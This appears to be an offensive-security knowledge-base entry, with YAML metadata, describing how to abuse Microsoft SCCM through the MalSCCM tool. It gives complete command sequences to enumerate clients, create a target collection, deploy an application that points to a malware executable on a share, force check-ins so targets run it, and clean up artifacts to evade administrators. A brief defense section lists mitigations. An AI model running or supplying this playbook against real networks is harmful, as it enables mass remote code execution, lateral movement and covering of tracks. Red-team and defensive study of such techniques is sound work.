---
id: f367fd60-eb2d-4718-be46-c6e1d5ca4a83
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.155167+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
techniques:
  - '[[Third-party Software]]'
sub_techniques: []
tags:
  - active-directory
  - sccm
  - lateral-movement
  - persistence
platforms:
  - Windows
commands:
  - '[[commands/Locate-SCCM-server-using-MalSCCM]]'
  - '[[commands/Inspect-SCCM-server-groups-using-MalSCCM]]'
  - '[[commands/Inspect-all-clients-using-MalSCCM]]'
  - '[[commands/Inspect-computer-clients-using-MalSCCM]]'
  - '[[commands/Inspect-primary-user-clients-using-MalSCCM]]'
  - '[[commands/Inspect-group-clients-using-MalSCCM]]'
  - '[[commands/Create-device-target-group-using-MalSCCM]]'
  - '[[commands/Add-host-to-target-group-using-MalSCCM]]'
  - '[[commands/Create-malicious-application-using-MalSCCM]]'
  - '[[commands/Inspect-applications-using-MalSCCM]]'
  - '[[commands/Deploy-application-to-target-group-using-MalSCCM]]'
  - '[[commands/Inspect-deployments-using-MalSCCM]]'
  - '[[commands/Checkin-target-group-using-MalSCCM]]'
  - '[[commands/Cleanup-application-using-MalSCCM]]'
  - '[[commands/Delete-target-group-using-MalSCCM]]'
tools:
  - '[[tools/MalSCCM]]'
validated: true
---

# Create-and-Deploy-Malicious-Application-via-SCCM

## Summary

This procedure uses the MalSCCM tool to abuse Microsoft System Center Configuration Manager (SCCM) for creating a malicious application and deploying it to a targeted device collection. It enables attackers with SCCM administrative access to execute arbitrary code on multiple endpoints, facilitating lateral movement, persistence, or payload delivery in Active Directory environments.

## Description

SCCM is a legitimate enterprise tool for software deployment and management. With administrative privileges, an attacker can create custom applications pointing to malicious executables hosted on accessible shares and deploy them to device groups. This procedure outlines reconnaissance of SCCM infrastructure, group creation, application deployment, and cleanup. It assumes the attacker has domain admin or SCCM admin rights and access to a management point. The technique leverages SCCM's push deployment to force execution on targets without direct interaction, evading some endpoint detection by mimicking legitimate updates. Mapped to MITRE ATT&CK T1072 (Software Deployment Tools) under Execution and Persistence tactics.

## Requirements

1. Administrative access to SCCM console or WMI endpoints (e.g., domain admin credentials).
2. MalSCCM.exe tool downloaded and executed from an attacker-controlled machine with network access to SCCM server.
3. Access to a world-readable SMB share for hosting the malicious executable (e.g., \server\share\malware.exe).
4. PowerShell execution policy allowing script runs on the attacker's machine.
5. Knowledge of SCCM site code and server FQDN.

## Defense

- Restrict SCCM administrative roles to least privilege using RBAC; audit and monitor SCCM console logons.
- Enable SCCM logging for application deployments and review for anomalous creations (e.g., unusual UNC paths).
- Implement application whitelisting on endpoints to block unsigned or unexpected executables.
- Monitor WMI queries and SMB shares for abuse; use network segmentation to isolate SCCM traffic.
- Regularly audit device collections and deployments via SCCM reports.

## Objectives

1. Reconnoiter SCCM clients, groups, and infrastructure to identify targets.
2. Create a device collection for targeted deployment.
3. Build and deploy a malicious application to the collection.
4. Trigger check-in to force immediate execution on targets.
5. Clean up artifacts to maintain stealth.

## Instructions

### Step 1: Locate the SCCM Management Server

**Context**: Identify the SCCM primary site server that clients communicate with, as this is required for subsequent inspections and operations. This step ensures the tool targets the correct infrastructure.

**Command** ([[commands/Locate-SCCM-server-using-MalSCCM]]):
```bash
MalSCCM.exe locate
```

> This command queries the local machine or network to find the SCCM management point. Run it from a compromised domain-joined host. If successful, it outputs the server FQDN or IP, which is used in later steps for server-specific inspections.

### Step 2: Inspect SCCM Server Groups

**Context**: Enumerate device collections and groups on the SCCM distribution point to understand existing targets and avoid conflicts. Requires the server FQDN from Step 1.

**Command** ([[commands/Inspect-SCCM-server-groups-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /server:<DistributionPoint-Server-FQDN> /groups
```

> Replace <DistributionPoint-Server-FQDN> with the actual server name (e.g., sccm.contoso.com). This WMI-based query lists all groups with details like membership. Use this to select or create new groups for targeting.

### Step 3: Inspect Available Clients

**Context**: Gather an overview of managed clients (computers, users, groups) to identify high-value targets for deployment. Use sub-options to filter as needed.

**Command** ([[commands/Inspect-all-clients-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /all
```

**Command** ([[commands/Inspect-computer-clients-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /computers
```

**Command** ([[commands/Inspect-primary-user-clients-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /primaryusers
```

**Command** ([[commands/Inspect-group-clients-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /groups
```

> These commands enumerate all or filtered clients. /all provides a comprehensive list; use /computers for device targets. Output includes names, OS, and last check-in times. Select devices like domain controllers or workstations for the target group.

### Step 4: Create a Target Device Group

**Context**: Establish a new device collection to isolate the deployment targets, preventing broad impact.

**Command** ([[commands/Create-device-target-group-using-MalSCCM]]):
```bash
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
```

> This creates a new static device collection named TargetGroup. Verify creation by re-running the inspect groups command from Step 3. The group starts empty and will be populated next.

### Step 5: Add Hosts to the Target Group

**Context**: Populate the group with specific devices identified in reconnaissance, enabling targeted deployment.

**Command** ([[commands/Add-host-to-target-group-using-MalSCCM]]):
```bash
MalSCCM.exe group /addhost /groupname:TargetGroup /host:<HOSTNAME>
```

> Replace <HOSTNAME> with a target like WIN2016-SQL. Add multiple hosts by repeating the command. Output confirms addition; inspect the group to verify membership.

### Step 6: Create the Malicious Application

**Context**: Define a new SCCM application that points to a malicious executable on an accessible share, mimicking legitimate software deployment.

**Command** ([[commands/Create-malicious-application-using-MalSCCM]]):
```bash
MalSCCM.exe app /create /name:demoapp /uncpath:"\\<SCCM-SERVER>\SCCMContentLib$\<MALWARE.EXE>"
```

> Replace placeholders with actual server/share and malware file (e.g., localthread.exe). This registers the app in SCCM. Follow with inspection to confirm.

**Command** ([[commands/Inspect-applications-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /applications
```

> Lists all applications, including the new one, with details like UNC path.

### Step 7: Deploy the Application to the Target Group

**Context**: Assign the malicious app to the group as a required deployment, triggering automatic installation on check-in.

**Command** ([[commands/Deploy-application-to-target-group-using-MalSCCM]]):
```bash
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
```

> This creates a deployment assignment. Specify required/available as needed via additional flags if supported.

**Command** ([[commands/Inspect-deployments-using-MalSCCM]]):
```bash
MalSCCM.exe inspect /deployments
```

> Verifies the deployment status and targets.

### Step 8: Force Target Group Check-in

**Context**: Prompt the targeted devices to poll SCCM immediately, accelerating payload execution without waiting for scheduled intervals.

**Command** ([[commands/Checkin-target-group-using-MalSCCM]]):
```bash
MalSCCM.exe checkin /groupname:TargetGroup
```

> This simulates a client check-in for the group, forcing download and run of the deployed app. Monitor endpoints for execution.

### Step 9: Cleanup Artifacts

**Context**: Remove the application and group to erase evidence and avoid alerting admins during log reviews.

**Command** ([[commands/Cleanup-application-using-MalSCCM]]):
```bash
MalSCCM.exe app /cleanup /name:demoapp
```

**Command** ([[commands/Delete-target-group-using-MalSCCM]]):
```bash
MalSCCM.exe group /delete /groupname:TargetGroup
```

> Cleanup removes the app and its deployments; delete erases the group. Confirm via inspection commands.
